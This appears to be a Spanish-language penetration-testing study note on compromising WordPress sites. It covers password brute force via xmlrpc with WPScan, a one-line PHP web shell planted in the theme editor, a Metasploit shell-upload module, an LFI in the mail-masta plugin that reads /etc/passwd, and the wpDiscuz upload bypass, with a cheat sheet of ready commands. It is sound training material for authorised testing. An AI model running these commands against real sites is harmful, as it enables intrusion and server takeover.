---
tags:
  - webapp
  - wordpress
  - attack
---
## Conceptos Clave (TL;DR)
* El acceso a la red interna puede lograrse abusando de las funcionalidades integradas de WordPress, como el panel de inicio de sesión y el editor de temas.
* La obtención de credenciales de administrador permite la ejecución remota de código (RCE) mediante la modificación del código fuente PHP en el editor de temas.
* La gran mayoría de las vulnerabilidades en WordPress residen en plugins (89%) y temas (7%), no en el núcleo o "core" de la aplicación (4%).
* Es crítico enumerar exhaustivamente, ya que los plugins antiguos o no utilizados que los desarrolladores olvidaron eliminar a menudo contienen vulnerabilidades explotables.

## Herramientas Clave
* **WPScan:** Utilizado para enumerar usuarios y realizar ataques de fuerza bruta contra las credenciales.
* **cURL:** Empleado para interactuar con las web shells subidas a los directorios del servidor.
* **Metasploit (`wp_admin_shell_upload`):** Módulo que automatiza la subida de un plugin malicioso para ejecutar una shell de Meterpreter cuando se tienen credenciales válidas.
* **waybackurls:** Herramienta útil para buscar versiones antiguas del sitio objetivo a través de Wayback Machine e identificar plugins olvidados.

## Metodología Paso a Paso

### Fase 1: Fuerza Bruta de Credenciales
Una vez enumerados los usuarios, se procede a realizar fuerza bruta. WordPress tiene dos métodos de autenticación: la página estándar `wp-login` y la API a través de `/xmlrpc.php`. Se debe priorizar el método `xmlrpc` debido a que es más rápido.

### Fase 2: Ejecución de Código Autenticada (Manual)
Con credenciales de administrador, inicia sesión y dirígete al Panel de Administración. Navega a *Appearance* -> *Theme Editor*. Selecciona un tema inactivo (ej. Twenty Nineteen) para evitar corromper el sitio principal. Modifica una página poco común como `404.php`, inyecta una web shell en PHP y guarda los cambios. Interactúa con la shell navegando a la ruta del tema.

### Fase 3: Explotación de Plugins Vulnerables
Incluso sin credenciales, un plugin vulnerable puede comprometer el servidor. Enumera todos los plugins instalados (activos e inactivos). Busca exploits públicos. Por ejemplo, el plugin `mail-masta` permite la inclusión local de archivos (LFI) sin autenticación a través de una falta de sanitización. El plugin `wpDiscuz` (versión 7.0.4) sufre de un bypass en la validación del tipo MIME, permitiendo la subida de archivos PHP maliciosos (RCE).

### Fase 4: Limpieza y Documentación (Post-Explotación)
Las herramientas automatizadas y los exploits públicos suelen dejar artefactos en el servidor (ej. plugins maliciosos en `/wp-content/plugins/` o archivos en `/wp-content/uploads/`). Debes intentar eliminar estos archivos y, obligatoriamente, documentarlos en los apéndices del reporte.

## Cheat Sheet de Comandos

```bash
# Fuerza bruta de contraseñas usando el método xmlrpc (más rápido).
# -t define los hilos, -U el usuario (o archivo), -P el diccionario.
sudo wpscan --password-attack xmlrpc -t 20 -U <USER> -P <PASSWORD_LIST> --url <TARGET_URL>
```

```php
# Payload simple de PHP para inyectar en el Theme Editor (ej. 404.php) debajo de los comentarios.
system($_GET[0]);
```

```bash
# Interacción con la web shell inyectada en el Theme Editor usando cURL.
curl http://<DOMAIN>/wp-content/themes/<THEME_NAME>/404.php?0=id
```

```bash
# Configuración del módulo de Metasploit para subir una shell autenticada.
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME <USER>
set PASSWORD <PASSWORD>
set LHOST <ATTACKER_IP>
set RHOSTS <TARGET_IP>
set VHOST <DOMAIN>
exploit
```

```bash
# Explotación de LFI en el plugin vulnerable mail-masta para leer /etc/passwd.
curl -s http://<DOMAIN>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

```bash
# Ejecución del script de exploit para el bypass de subida de archivos en wpDiscuz.
python3 wp_discuz.py -u http://<DOMAIN> -p /?p=1
```

```bash
# Interacción manual con la shell subida por el exploit de wpDiscuz si la ejecución automática falla.
curl -s http://<DOMAIN>/wp-content/uploads/<YEAR>/<MONTH>/<SHELL_NAME>.php?cmd=id
```


## "Gotchas" y Troubleshooting
* **WPScan API:** WPScan no mostrará datos de vulnerabilidades a menos que proporciones un token de la API de WPVulnDB (se pueden obtener 50 peticiones diarias gratis).
* **Metasploit VHOST:** Al usar `wp_admin_shell_upload`, si el objetivo utiliza enrutamiento basado en nombres, es obligatorio configurar tanto el `VHOST` como el `RHOSTS`. Si no se hace, el exploit fallará con el error de que el objetivo no parece estar usando WordPress.
* **Ejecución Fallida en wpDiscuz:** El script en Python para explotar wpDiscuz puede fallar al intentar ejecutar los comandos automáticamente en la consola (mostrando `[x] Failed to execute PHP code...`). Sin embargo, la web shell se sube correctamente y puede interactuarse con ella de forma manual usando `cURL` añadiendo el parámetro `?cmd=` al final de la URL generada.
* **Limpieza de Artefactos:** Algunos módulos de Metasploit fallan al limpiar los plugins maliciosos generados dinámicamente. Se debe hacer un esfuerzo manual para eliminarlos y listarlos en el reporte bajo "Artefactos creados en los sistemas".